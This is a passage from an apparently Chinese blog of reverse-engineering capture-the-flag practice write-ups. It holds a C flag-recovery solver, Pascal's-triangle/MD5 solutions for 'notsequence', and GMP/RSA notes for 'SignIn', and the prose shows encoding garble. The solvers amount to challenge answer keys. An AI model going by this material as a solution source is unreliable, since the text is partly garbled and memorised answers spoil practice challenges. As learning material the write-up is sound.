class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">102</span>,  <span class="number">52</span>, <span class="number">101</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">56</span>,  <span class="number">52</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">52</span>,  <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>,  <span class="number">49</span>, <span class="number">100</span>,  <span class="number">53</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">101</span>,  <span class="number">54</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c[] = &#123;</span><br><span class="line">   <span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>,  <span class="number">48</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">103</span>,  <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">250</span>,  <span class="number">89</span>,  <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, </span><br><span class="line">  <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>,  <span class="number">38</span>,  <span class="number">54</span>,  <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, </span><br><span class="line">   <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>,  <span class="number">49</span>,  <span class="number">21</span>,   <span class="number">4</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">195</span>,  <span class="number">24</span>, <span class="number">150</span>,   <span class="number">5</span>, <span class="number">154</span>,   <span class="number">7</span>,  <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, </span><br><span class="line">  <span class="number">235</span>,  <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>,   <span class="number">9</span>, <span class="number">131</span>,  <span class="number">44</span>,  <span class="number">26</span>,  <span class="number">27</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">160</span>,  <span class="number">82</span>,  <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>,  <span class="number">41</span>, <span class="number">227</span>,  <span class="number">47</span>, <span class="number">132</span>, </span><br><span class="line">   <span class="number">83</span>, <span class="number">209</span>,   <span class="number">0</span>, <span class="number">237</span>,  <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>,  <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, </span><br><span class="line">  <span class="number">190</span>,  <span class="number">57</span>,  <span class="number">74</span>,  <span class="number">76</span>,  <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">77</span>,  <span class="number">51</span>, <span class="number">133</span>,  <span class="number">69</span>, <span class="number">249</span>,   <span class="number">2</span>, <span class="number">127</span>,  <span class="number">80</span>,  <span class="number">60</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">168</span>,  <span class="number">81</span>, <span class="number">163</span>,  <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>,  <span class="number">56</span>, <span class="number">245</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>,  <span class="number">33</span>,  <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>,  <span class="number">12</span>, </span><br><span class="line">   <span class="number">19</span>, <span class="number">236</span>,  <span class="number">95</span>, <span class="number">151</span>,  <span class="number">68</span>,  <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">100</span>,  <span class="number">93</span>,  <span class="number">25</span>, <span class="number">115</span>,  <span class="number">96</span>, <span class="number">129</span>,  <span class="number">79</span>, <span class="number">220</span>,  <span class="number">34</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">136</span>,  <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>,  <span class="number">20</span>, <span class="number">222</span>,  <span class="number">94</span>,  <span class="number">11</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">224</span>,  <span class="number">50</span>,  <span class="number">58</span>,  <span class="number">10</span>,  <span class="number">73</span>,   <span class="number">6</span>,  <span class="number">36</span>,  <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, </span><br><span class="line">  <span class="number">172</span>,  <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>,  <span class="number">55</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">141</span>, <span class="number">213</span>,  <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>,  <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, </span><br><span class="line">  <span class="number">174</span>,   <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>,  <span class="number">37</span>,  <span class="number">46</span>,  <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, </span><br><span class="line">  <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>,  <span class="number">31</span>,  <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>,  <span class="number">62</span>, </span><br><span class="line">  <span class="number">181</span>, <span class="number">102</span>,  <span class="number">72</span>,   <span class="number">3</span>, <span class="number">246</span>,  <span class="number">14</span>,  <span class="number">97</span>,  <span class="number">53</span>,  <span class="number">87</span>, <span class="number">185</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">193</span>,  <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>,  <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, </span><br><span class="line">  <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>,  <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>,  <span class="number">85</span>,  <span class="number">40</span>, <span class="number">223</span>, </span><br><span class="line">  <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>,  <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>,  <span class="number">66</span>, <span class="number">104</span>,  <span class="number">65</span>, <span class="number">153</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">15</span>, <span class="number">176</span>,  <span class="number">84</span>, <span class="number">187</span>,  <span class="number">22</span>,  <span class="number">72</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = <span class="number">0</span>, temp1 = <span class="number">0</span>, q = <span class="number">0</span>, w = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"> temp = (j &gt;&gt; <span class="number">4</span>) % <span class="number">16</span>; </span><br><span class="line"> temp1 = (<span class="number">16</span>*j &gt;&gt; <span class="number">4</span>) % <span class="number">16</span>;</span><br><span class="line"> q = a[<span class="number">2</span>*i];</span><br><span class="line"> <span class="keyword">if</span>(q &lt; <span class="number">48</span> || q &gt; <span class="number">57</span>)</span><br><span class="line"> q = q<span class="number">-87</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">q = q<span class="number">-48</span>;</span><br><span class="line">q = q*<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">w = b[<span class="number">2</span>*i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(w &lt; <span class="number">48</span> || w &gt; <span class="number">57</span>)</span><br><span class="line">w = w<span class="number">-87</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">w = w<span class="number">-48</span>; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span>(c[<span class="number">16</span>*temp + temp1] == ((w+q) ^ <span class="number">0x19</span>))</span><br><span class="line"> &#123;</span><br><span class="line"> flag[i] = j;</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502083319440-1590490435324-1591162365723.png" alt="image-20200502083319440-1590490435324"></p><p><strong>æ€»ç»“: &gt;&gt; è¿ç®—ç¬¦ç§»åŠ¨nä½å°±ç›¸å½“äºé™¤ä»¥2^n. ä¸” % çš„ä¼˜å…ˆçº§å¤§äº &gt;&gt;</strong></p><h3 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h3><p>è‡ªå·±ç®—æ³•å¤ªèœäº†, è¿™é“é¢˜çš„2ä¸ªå‡½æ•°å§‹ç»ˆæ²¡çœ‹æ‡‚â€¦ çœ‹äº†writeup, æ¨è¾‰ä¸‰è§’å½¢!</p><p>çœ‹äº†writeup, è‡ªå·±æ…¢æ…¢çš„åˆ†æäº†ä¸‹. é¦–å…ˆ, check1å‡½æ•°.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502131757195-1590490442991-1591162417995.png" alt="image-20200502131757195-1590490442991"></p><p>ç„¶åæ˜¯check2.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502133008194-1590490446814-1591162443875.png" alt="image-20200502133008194-1590490446814"></p><p>ç»è¿‡è¿™2ä¸ªå‡½æ•°åˆ¤æ–­, å°±èƒ½çŸ¥é“æ˜¯å¦æ˜¯æ¨è¾‰ä¸‰è§’å½¢äº†. æŠŠå‰20è¡Œçš„æ•°æ®ç»è¿‡md5åŠ å¯†å°±æ˜¯flag.</p><p>æœ€å, é¢˜è‡ªå·±è™½ç„¶æ¯åšå‡ºæ¥, å€’æ˜¯é€šè¿‡è¿™ä¸ªé¢˜é‡æ–°è®¤è¯†äº†æ¨è¾‰ä¸‰è§’å½¢. å†™äº†Cè¯­è¨€å’Œpythonçš„ç‰ˆæœ¬. ä¹Ÿæ˜¯æƒ³æ‰“å°å‡ºæ¥çœ‹çœ‹, ä¸”è‡ªå·±åˆšæ¥è§¦python, ä»£ç ä¹±è€Œé•¿.</p><p><strong>python3:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createL</span><span class="params">(l)</span>:</span></span><br><span class="line">    L = [<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, len(l)):</span><br><span class="line">        L.append(l[x] + l[x<span class="number">-1</span>])</span><br><span class="line">    L.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printL</span><span class="params">(L, W)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">        s += str(x) + <span class="string">" "</span></span><br><span class="line">    print(s.center(W))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_</span><span class="params">(s, L)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> L:</span><br><span class="line">        s += str(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">L = [<span class="number">1</span>]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line">row = int(input(<span class="string">"è¯·è¾“å…¥è¡Œæ•°: "</span>))</span><br><span class="line">width =row* <span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(row):</span><br><span class="line">    printL(L, width)</span><br><span class="line">    s = str_(s, L)</span><br><span class="line">    L = createL(L)</span><br><span class="line">print(s)</span><br><span class="line">m = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">print(<span class="string">"md5åŠ å¯†å:%s"</span> % m)</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">creat</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(lenth+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; lenth; i++)</span><br><span class="line">p[i] = L[i<span class="number">-1</span>] + L[i];</span><br><span class="line"></span><br><span class="line">p[lenth] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> blank_l, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; blank_l; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  "</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%4d"</span>, L[i]); </span><br><span class="line"></span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">translate</span><span class="params">(<span class="keyword">int</span> *L, <span class="keyword">int</span> lenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>), temp[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">"%d"</span>, L[i]);</span><br><span class="line"><span class="built_in">strcat</span>(p, temp); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥è¡Œæ•°: "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = creat(p, i);</span><br><span class="line"><span class="built_in">print</span>(p, n-i, i+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">strcat</span>(a, (<span class="keyword">char</span> *)translate(p, i+<span class="number">1</span>));</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\næ‰€æœ‰æ•°å€¼ç»„æˆçš„å­—ç¬¦ä¸²ä¸º: %s"</span>, a); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“: åœ¨çœ‹ä¸æ‡‚ä»£ç çš„æ—¶å€™, åº”è¯¥æŠŠèƒ½å†™å‡ºæ¥çš„å€¼éƒ½åˆ—ä¸¾å‡ºæ¥, è§‚å¯Ÿä¸€ä¸‹è§„å¾‹.</strong></p><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p>è¿™é“é¢˜æ›´åƒæ˜¯æ˜¯cryptoçš„é¢˜, åˆæ¬¡äº†è§£äº†ä¸‹Rsa.</p><p>ç¨‹åºä¸‹è½½ä¸‹æ¥, æœ‰ä¸€ç³»åˆ—ä¸è®¤è¯†çš„å‡½æ•°, å¤§æ¦‚çŸ¥é“ç”¨æ³•, è¿˜æ˜¯å…ˆå–æŸ¥äº†æŸ¥.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503094008020-1590490467616-1591162454456.png" alt="image-20200503094008020-1590490467616"></p><p>GMP(The GNU Multiple Precision Arithmetic Library)åˆå«GNUå¤šç²¾åº¦ç®—æœ¯åº“ï¼Œæ˜¯ä¸€ä¸ªæä¾›äº†å¾ˆå¤šæ“ä½œé«˜ç²¾åº¦çš„å¤§æ•´æ•°ï¼Œæµ®ç‚¹æ•°çš„è¿ç®—çš„ç®—æœ¯åº“ï¼Œå‡ ä¹æ²¡æœ‰ä»€ä¹ˆç²¾åº¦æ–¹é¢çš„é™åˆ¶ï¼ŒåŠŸèƒ½ä¸°å¯Œ. å‡ ä¸ªå¸¸ç”¨çš„:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">æ·»åŠ å¤´æ–‡ä»¶ï¼š<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gmp.h&gt; </span></span></span><br><span class="line"></span><br><span class="line">ã€€ã€€cmdç¼–è¯‘å‘½ä»¤ï¼šgcc myprogram.c -lgmp -lm -o myprogram</span><br><span class="line"></span><br><span class="line">ã€€ã€€å£°æ˜ä¸€ä¸ªgmpçš„æ•´æ•°rop ï¼š<span class="keyword">mpz_t</span> rop;</span><br><span class="line"></span><br><span class="line">ã€€ã€€æŠŠå­—ç¬¦ä¸²åˆå§‹åŒ–ä¸ºgmpå¤§æ•´æ•°ï¼š<span class="function"><span class="keyword">int</span> <span class="title">mpz_init_set_str</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">char</span>*str, <span class="keyword">int</span> base)</span></span>; </span><br><span class="line"></span><br><span class="line">ã€€ã€€é‡Šæ”¾ç©ºé—´ï¼š<span class="function"><span class="keyword">void</span>  <span class="title">mpz_clear</span><span class="params">(<span class="keyword">mpz_t</span> rop)</span></span>;<span class="comment">//å£°æ˜äº†ä¸€ä¸ªå˜é‡ï¼Œåœ¨ç¨‹åºçš„æœ€åä¸€å®šè¦é‡Šæ”¾ï¼Œä¸ç„¶ä¼šæŠ¥é”™</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€åŠ æ³•ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_add</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>;  <span class="comment">//rop = op1 + op2</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€å‡æ³•ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_sub</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>;  <span class="comment">//rop = op1 - op2</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€ä¹˜æ³•ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_mul</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>; <span class="comment">//rop = op1 * op2</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€é™¤æ³•ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_cdiv_q</span> <span class="params">(<span class="keyword">mpz_t</span> q, <span class="keyword">mpz_t</span> n, <span class="keyword">mpz_t</span> d)</span></span>;  <span class="comment">//q = n/d,è¿™ä¸ªæœ‰å¾ˆå¤šç§ç±»å‹ï¼Œå…·ä½“çš„çœ‹ä½¿ç”¨æ‰‹å†Œ</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€å¹‚è¿ç®—ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_pow_ui</span> <span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> base, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">exp</span>)</span></span>;  <span class="comment">//rop = base^exp</span></span><br><span class="line">  void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod)  ä½œç”¨: Set rop to base^exp mod mod. è¿™æ˜¯è¿™é“é¢˜ä¸­ç”¨åˆ°çš„. ä¹Ÿæ˜¯rsaåŠ å¯†è§£å¯†å¸¸ç”¨çš„.</span><br><span class="line">          </span><br><span class="line"></span><br><span class="line">ã€€ã€€å¼€æ–¹ï¼š<span class="function"><span class="keyword">void</span> <span class="title">mpz_sqrt</span> <span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op)</span></span>; <span class="comment">//rop = opå¼€æ–¹çš„å‘ä¸‹å–æ•´</span></span><br></pre></td></tr></table></figure><p>æ•´ä¸ªæµç¨‹, æ˜¾ç„¶æ˜¯rsaåŠ å¯†.  </p><table><thead><tr><th align="center">æ­¥éª¤</th><th>è¯´æ˜</th><th>æè¿°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">1</td><td>æ‰¾å‡ºè´¨æ•°</td><td>P ã€Q</td><td>-</td></tr><tr><td align="center">2</td><td>è®¡ç®—å…¬å…±æ¨¡æ•°</td><td>N = P * Q</td><td>-</td></tr><tr><td align="center">3</td><td>æ¬§æ‹‰å‡½æ•°</td><td>Ï†(N) = (P-1)(Q-1)</td><td>-</td></tr><tr><td align="center">4</td><td>è®¡ç®—å…¬é’¥E</td><td>1 &lt; E &lt; Ï†(N)</td><td>Eçš„å–å€¼å¿…é¡»æ˜¯æ•´æ•°  E å’Œ Ï†(N) å¿…é¡»æ˜¯äº’è´¨æ•°</td></tr><tr><td align="center">5</td><td>è®¡ç®—ç§é’¥D</td><td>E * D % Ï†(N) = 1</td><td>-</td></tr><tr><td align="center">6</td><td>åŠ å¯†</td><td>C ï¼ M ^E mod N</td><td>Cï¼šå¯†æ–‡  Mï¼šæ˜æ–‡</td></tr><tr><td align="center">7</td><td>è§£å¯†</td><td>M ï¼C ^D mod N</td><td>Cï¼šå¯†æ–‡  Mï¼šæ˜æ–‡</td></tr></tbody></table><p>ä½†æ˜¯ä¹‹å‰æœ‰ä¸€ä¸ªsub_96Aå‡½æ•°.(æœ€ä¸Šé¢çš„ç®­å¤´æ‰€ç¤º), ç°åœ¨è¿›å…¥è¿™ä¸ªå‡½æ•°çœ‹çœ‹. è¿™é‡Œæ˜¯ä»å­—ç¬¦çš„ASCIIè½¬åŒ–ä¸º16è¿›åˆ¶, <strong>(æœ€ä¸Šé¢çš„ Windows_Reverse2æœ‰ä» 16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦çš„ç®—æ³•, éƒ½æŒºç®€æ´çš„)</strong><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503094306385-1590490481485-1591162474450.png" alt="image-20200503094306385-1590490481485"></p><p>æ•´ä¸ªç¨‹åºå°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦, å…ˆè½¬åŒ–ä¸º16è¿›åˆ¶æ•°å€¼å­—ç¬¦, å†å˜æˆä¸€ä¸ªå¤§æ•°ä½œä¸ºæ˜æ–‡. ç»è¿‡  <strong>C ï¼ M ^E mod N</strong>, åŠ å¯†åå’Œç¼–ç çš„å¯†æ–‡è¿›è¡Œå¯¹æ¯”. é¦–å…ˆè¿™é‡Œçš„ E = v5 = 65537. Mæ˜¯æ˜æ–‡. N = v4 = 103461035900816914121390101299049044413950405173712170434161686539878160984549. æ 